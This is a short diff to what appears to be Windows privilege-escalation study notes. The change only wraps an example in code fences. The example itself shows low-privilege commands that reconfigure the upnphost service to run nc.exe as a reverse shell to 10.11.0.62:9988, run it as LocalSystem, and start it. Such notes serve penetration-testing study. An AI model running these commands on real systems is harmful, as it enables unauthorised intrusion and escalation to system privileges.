@@ -109,9 +109,11 @@ copy evil-tftp.exe E:\GrabLogs\tftp.exe
 Example:
 
 Victim machine low priv:
+```
 sc qc upnphost
 sc config upnphost binpath= "C:\Inetpub\Scripts\nc.exe -nv 10.11.0.62 9988 -e C:\WINDOWS\System32\cmd.exe"
 sc config upnphost obj= ".\LocalSystem" password= ""
 sc qc upnphost
 net start upnphost
 sc qc SSDPSRV
+```
